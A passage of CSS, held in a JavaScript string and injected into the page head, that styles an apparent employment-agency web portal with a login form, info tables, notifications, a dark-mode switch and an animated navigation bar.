    flex-direction: column;
    width: 100%;
    text-align: center;
    font-weight: 500;
}

.navbar ul li a .icon {
    position: relative;
    display: block;
    line-height: 75px;
    font-size: 1.5em;
    text-align: center;
    color: #fff;
    transition: .5s;
}

.navbar ul li.active a .icon {
    transform: translateY(33px);
}

.navbar ul li a .text {
    position: absolute;
    color: #fff;
    font-weight: 400;
    font-size: .75em;
    letter-spacing: .05em;
    opacity: 0;
    transform: translateY(20px);
    transition: .5s;
}

.navbar ul li.active a .text {
    font-weight: 600;
    font-size: 15px;
    right: 20%;
    opacity: 1;
    transform: translateY(-15px);
}

.navbar ul li a .circle {
    position: absolute;
    display: block;
    width: 50px;
    height: 50px;
    background: transparent;
    border-radius: 50%;
    border: 1.8px solid #fff;
    transform: translateY(-37px) scale(0);
}

.navbar ul li.active a .circle {
    top: -0.26rem;
    right: 11.2%;
    transition: .5s;
    transition-delay: .5s;
    transform: translateY(25px) scale(1);
}

.indicator {
    position: absolute;
    top: 17%;
    width: 60px;
    height: 60px;
    right: 74.5%;
    background: #519985;
    border: 6px solid #ffffff;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    transition: .5s;
}

.indicator::before {
    content: '';
    position: absolute;
    top: 0;
    left: -21.5px;
    width: 24px;
    height: 20px;
    background: transparent;
    border-bottom-right-radius: 20px;
    box-shadow: 1px 10px 0 #ffffff;
}

.indicator::after {
    content: '';
    position: absolute;
    top: 0;
    right: -21.5px;
    width: 24px;
    height: 20px;
    background: transparent;
    border-bottom-left-radius: 20px;
    box-shadow: -1px 10px 0 #ffffff;
}

.indicator-dark-mode {
    border: 6px solid #121212;
}

.indicator-dark-mode::before {
    box-shadow: 1px 10px 0 #121212;
}

.indicator-dark-mode::after {
    box-shadow: -1px 10px 0 #121212;
}

.navbar ul li:nth-child(1).active~.indicator {
    transform: translateX(calc(70px * 0));
}

.navbar ul li:nth-child(2).active~.indicator {
    transform: translateX(calc(70px * 1));
}

.navbar ul li:nth-child(3).active~.indicator {
    transform: translateX(calc(70px * 2));
}

#pgr {
    position: relative;
    top: 1rem;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 9999;
}

#pgr-ag {
    position: relative;
    top: 1rem;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 9999;
}

.loader {
    width: 40px;
    height: 40px;
    animation: rotate 2s linear infinite;
}

.loader-circle {
    fill: none;
    stroke: #48907CEE;
    stroke-width: 4;
    stroke-linecap: round;
    animation: dash 1.5s ease-in-out infinite;
}

@keyframes rotate {
    100% {
        transform: rotate(360deg);
    }
}

@keyframes dash {
    0% {
        stroke-dasharray: 1, 150;
        stroke-dashoffset: 0;
    }
    50% {
        stroke-dasharray: 90, 150;
        stroke-dashoffset: -35;
    }
    100% {
        stroke-dasharray: 90, 150;
        stroke-dashoffset: -124;
    }
}

.displayAgenceH {
    margin-top: -10px;
    margin-bottom: 10px;
    justify-items: start;
    border: 2px solid #468977;
    border-radius: 8px;
}

.h2Agency,
.h2Agency2,
.h2Agency3 {
    margin-block-start: 0.5em;
    margin-right: 8px;
}

main {
    font-family: Arial, sans-serif;
    grid-template-columns: 1fr;
    justify-items: center;
    align-items: center;
    gap: 10px;
    padding: 10px 5px 5px;
}

header,
main {
    display: grid;
}

header {
    background-color: #519985;
    padding: 10px;
    height: 5%;
    justify-content: start;
}

#war-wassit {
    color: red;
    /* font-size: 13px; */
    font-weight: 500;
    font-size: 0.910714rem;
    line-height: 1.66;
    letter-spacing: 0.03333em;
    text-align: right;
    margin: 4px 14px 0px;
}

#war-nat {
    color: red;
    /* font-size: 13px; */
    font-weight: 500;
    font-size: 0.910714rem;
    line-height: 1.66;
    letter-spacing: 0.03333em;
    text-align: right;
    margin: 4px 14px 0px;
}

.login-container {
    background-color: rgba(255, 255, 255, 0.933);
    padding: 15px 9px 10px 9px;
    border: 1.5px solid #48907CEE;
    box-shadow: rgba(0, 0, 0, 0.2) 0px 3px 3px -2px, rgba(0, 0, 0, 0.14) 0px 3px 4px 0px, rgba(0, 0, 0, 0.12) 0px 1px 8px 0px;
    border-radius: 8px;
    width: 95%;
    max-width: 400px;
    text-align: center;
}

.login-header {
    color: white;
    height: 2.8rem;
    position: relative;
    top: -1.35rem;
    border-radius: 8px;
    justify-items: center;
    background-color: #48907CEE;
}

.loginFormCont {
    position: relative;
    margin-top: 4%;
    width: 100%;
    height: fit-content;
    top: 0rem;
}

.sit {
    display: none;
    margin-top: -25px;
    background-color: rgba(255, 255, 255, 0.933);
    padding: 15px 9px 10px 9px;
    border: 1.5px solid #48907CEE;
    box-shadow: rgba(0, 0, 0, 0.2) 0px 3px 3px -2px, rgba(0, 0, 0, 0.14) 0px 3px 4px 0px, rgba(0, 0, 0, 0.12) 0px 1px 8px 0px;
    border-radius: 8px;
    width: 95%;
    max-width: 400px;
    text-align: center;
}

.sit-header {
    color: white;
    height: 2.8rem;
    position: relative;
    top: -1.35rem;
    border-radius: 8px;
    justify-items: center;
    background-color: #48907CEE;
}

.sit-table {
    width: 100%;
    border-radius: 4px;
    border-collapse: collapse;
    overflow: hidden;
    box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 1px -1px, rgba(0, 0, 0, 0.14) 0px 1px 1px 0px, rgba(0, 0, 0, 0.12) 0px 1px 3px 0px;
}

.sit-table-border {
    border-radius: 4px;
    border: 1px solid #3a7564ee;
    overflow: hidden;
}

.sit-table-body tr {
    border-bottom: 1px solid #ddd;
}

.sit-table-body tr:last-child {
    border-bottom: 1px solid #468977;
}

.sit-table td {
    padding: 10px;
    text-align: left;
}

.sit-table td:first-child {
    text-align: justify;
    width: 46%;
    font-weight: bold;
    background-color: #dbdbdb;
}

.sit-table td:last-child {
    font-weight: bold;
    color: #2d2c2cc7;
    background-color: #fff;
    text-align: justify;
}

.sit-table tr:hover td:last-child {
    background-color: #f9f9f9;
}

h2 {
    position: relative;
    top: 15%;
    font-size: 24px;
}

.agencies {
    display: none;
    margin-top: -25px;
    background-color: rgba(255, 255, 255, 0.933);
    padding: 15px 9px 10px 9px;
    border: 1.5px solid #48907CEE;
    box-shadow: rgba(0, 0, 0, 0.2) 0px 3px 3px -2px, rgba(0, 0, 0, 0.14) 0px 3px 4px 0px, rgba(0, 0, 0, 0.12) 0px 1px 8px 0px;
    border-radius: 8px;
    width: 95%;
    max-width: 400px;
    text-align: center;
}

.agencies-header {
    color: white;
    height: 2.8rem;
    position: relative;
    top: -1.35rem;
    border-radius: 8px;
    justify-items: center;
    background-color: #48907CEE;
}

.agencies-table {
    width: 100%;
    margin-bottom: 15px;
    border-radius: 4px;
    border-collapse: collapse;
    overflow: hidden;
    box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 1px -1px, rgba(0, 0, 0, 0.14) 0px 1px 1px 0px, rgba(0, 0, 0, 0.12) 0px 1px 3px 0px;
}

.agencies-table tr {
    border-bottom: 1px solid #ddd;
}

.agencies-table tr:last-child {
    border-bottom: 1px solid #468977;
}

.agencies-table td {
    padding: 10px;
    text-align: left;
}

.agencies-table td:first-child {
    text-align: justify;
    width: 30%;
    font-weight: bold;
    color: white;
    background-color: #8b8b8b;
}

.agencies-table td:last-child {
    font-weight: bold;
    color: #ffffff;
    background-color: #e13535;
    text-align: justify;
}

.search-input {
    width: 100%;
    padding: 10px;
    margin-bottom: 20px;
    border: 2px solid #549785;
    border-radius: 5px;
    font-size: 16px;
    letter-spacing: 0.5px;
    font-weight: 600;
    font-family: 'Lateef', serif;
}

.search-input:focus {
    outline: none;
}

.input-group {
    margin-bottom: 15px;
}

label {
    display: block;
    margin-bottom: 5px;
    text-align: right;
    font-size: 17px;
}

input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 4px;
    box-sizing: border-box;
    transition: border-color 0.3s;
}

input:focus {
    outline: 1.8px solid #3a7564ee;
}

.Subtn {
    width: 45%;
    padding: 9px;
    background-color: #3a7564ee;
    border: none;
    color: white;
    border-radius: 4px;
    cursor: pointer;
    font-weight: bold;
}

.Subtn:hover {
    background-color: #4c9782ee;
}

.info-container {
    display: block;
    margin-top: -25px;
    width: 95%;
    max-width: 400px;
    border: 1.5px solid #48907CEE;
    background-color: #fff;
    padding: 15px 9px 10px 9px;
    box-shadow: rgba(0, 0, 0, 0.2) 0px 3px 3px -2px, rgba(0, 0, 0, 0.14) 0px 3px 4px 0px, rgba(0, 0, 0, 0.12) 0px 1px 8px 0px;
    border-radius: 8px;
}

.info-header {
    color: white;
    height: 2.8rem;
    text-align: center;
    position: relative;
    top: -1.35rem;
    border-radius: 8px;
    justify-items: center;
    background-color: #48907CEE;
}

.info-table {
    width: 100%;
    border-radius: 4px;
    border-collapse: collapse;
    overflow: hidden;
    box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 1px -1px, rgba(0, 0, 0, 0.14) 0px 1px 1px 0px, rgba(0, 0, 0, 0.12) 0px 1px 3px 0px;
}

.info-table-border {
    border-radius: 4px;
    border: 1px solid #3a7564ee;
    overflow: hidden;
}

.info-table-body tr {
    border-bottom: 1px solid #ddd;
}

.info-table-body tr:last-child {
    border-bottom: 1px solid #468977;
}

.info-table td {
    padding: 10px;
    text-align: left;
}

.info-table td:first-child {
    text-align: justify;
    width: 46%;
    font-weight: bold;
    background-color: #dbdbdb;
}

.info-table td:last-child {
    font-weight: bold;
    color: #2d2c2cc7;
    background-color: #fff;
    text-align: justify;
}

.info-table tr:hover td:last-child {
    background-color: #f9f9f9;
}

.btns {
    padding: 10px 0px 0px;
    display: grid;
    grid-template-columns: auto auto auto;
    gap: 10px;
    align-items: center;
}

.btns-sit {
    padding: 10px 0px 0px;
    display: grid;
    grid-template-columns: auto auto;
    gap: 10px;
    align-items: center;
}

.fa-rotate-right {
    font-size: 20px;
    color: #fafafa;
    background-color: #6176f1;
    border-radius: 18px;
    padding: 7px;
}

.refresh {
    left: 7%;
    position: absolute;
    background: transparent;
    border: none;
    cursor: pointer;
    top: 7px;
}

.checkRend,
.HideInfo,
.HideInfo2,
.logout2,
.logout {
    border: none;
    display: inline-block;
    color: #fff;
    font-size: 13px;
    cursor: pointer;
    border: none;
    border-radius: 4px;
    padding: 4px 15px;
    font-weight: bold;
}

.tel-channel {
    display: inline-block;
    color: #fff;
    font-size: 14px;
    cursor: pointer;
    border-radius: 4px;
    padding: 4px 15px;
    text-decoration: none;
    background-color: #229ED9;
}

.social-media {
    border: 1px solid #438b77;
    width: 95%;
    max-width: 400px;
    border-radius: 8px;
    padding: 7px 9px;
    text-align: center;
    font-weight: 700;
    box-shadow: rgba(0, 0, 0, 0.2) 0px 3px 3px -2px, rgba(0, 0, 0, 0.14) 0px 3px 4px 0px, rgba(0, 0, 0, 0.12) 0px 1px 8px 0px;
}

.checkRend {
    background-color: rgb(31, 177, 63);
}

.HideInfo {
    background-color: #0c38b5de;
}

.HideInfo2 {
    background-color: #0c38b5de;
}

.logout {
    background-color: rgb(205 42 42);
}

.logout2 {
    background-color: rgb(205 42 42);
}

#notify-login {
    display: none;
    height: fit-content;
    min-height: 2rem;
    border-radius: 6px;
    background-color: #e74545;
    text-align: center;
    margin-bottom: 5%;
}

#message-login {
    font-weight: bold;
    padding-top: 2%;
    color: rgb(255, 255, 255);
}

#notify-info {
    display: none;
    position: relative;
    width: 85%;
    right: 8%;
    top: -0.2rem;
    min-height: 2rem;
    border-radius: 6px;
    justify-items: center;
}

#message-info {
    padding-top: 1%;
    color: rgb(255, 255, 255);
}

#notify-sit-info {
    display: none;
    position: relative;
    width: 85%;
    right: 8%;
    top: -0.2rem;
    min-height: 2rem;
    border-radius: 6px;
    justify-items: center;
}

#message-sit-info {
    padding-top: 1%;
    color: rgb(255, 255, 255);
}

#notify-agn-info {
    display: none;
    position: relative;
    width: 85%;
    right: 8%;
    top: -0.2rem;
    min-height: 2rem;
    border-radius: 6px;
    justify-items: center;
}

#message-agn-info {
    padding-top: 1%;
    color: rgb(255, 255, 255);
}

#notify-info-info {
    display: none;
    position: relative;
    width: 85%;
    right: 8%;
    top: -0.6rem;
    border-radius: 4px;
    background-color: #0c38b5de;
    justify-items: center;
}

#message-info-info {
    padding-top: 2%;
    color: rgb(255, 255, 255);
}

#notify-checked {
    display: none;
    position: relative;
    width: fit-content;
    min-width: 57%;
    max-width: 58%;
    right: 21%;
    top: -0.5rem;
    padding: 1%;
    border-radius: 6px;
    background-color: #57a791;
    justify-items: center;
}

#message-checked {
    color: rgb(255 255 255);
    margin-block-start: 0em;
    margin-block-end: 0em;
}

.media {
    margin-top: 2%;
    border-radius: 4px;
    background-color: #ffffff;
    width: 100%;
    border: 1.5px solid;
}

audio {
    width: 100%;
    height: 24px;
    border-radius: 0
}

.container-dark {
    background-color: #292929;
}

body.dark-mode {
    background-color: #121212;
    color: white;
}

.switch-container {
    max-width: 61px;
}

.switch {
    position: relative;
    display: inline-block;
    width: 3.5rem;
    height: 1.6rem;
    right: -2.4rem;
    top: 0.2rem;
}

.switch input {
    opacity: 0;
    width: 0;
    height: 0;
}

.slider {
    position: absolute;
    cursor: pointer;
    top: 6px;
    right: 89%;
    width: 100%;
    height: 100%;
    overflow: hidden;
    bottom: 0;
    background-color: #edeaea;
    transition: 0.4s;
    border-radius: 24px;
}

.slider:before {
    position: absolute;
    content: "";
    height: 100%;
    width: 47%;
    right: 51%;
    bottom: 1%;
    background-color: #ecc30b;
    transition: 0.4s;
    border-radius: 50%;
}

.slider .icon {
    position: absolute;
    top: 50%;
    left: 6px;
    transform: translateY(-50%);
    font-size: 15px;
    /* color: #fdfdfd; */
    transition: transform 0.4s, color 0.4s;
}

.fa-moon:before {
    position: relative;
    left: 1.85rem;
}

.fa-moon {
    color: #8f8b8b;
}

.fa-sun:before {
    color: #8f8b8b;
}

input:checked+.slider:before {
    transform: translateX(26px);
    background-color: #5a75f5;
    right: 47%;
}

input:checked+.slider {
    background-color: #3d3d3d;
}

#anem-header {
    position: absolute;
    width: 55px;
    height: 55px;
    top: 0%;
    left: 4%;
}

.header-p {
    font-size: 12px;
}
`;
document.head.appendChild(style);
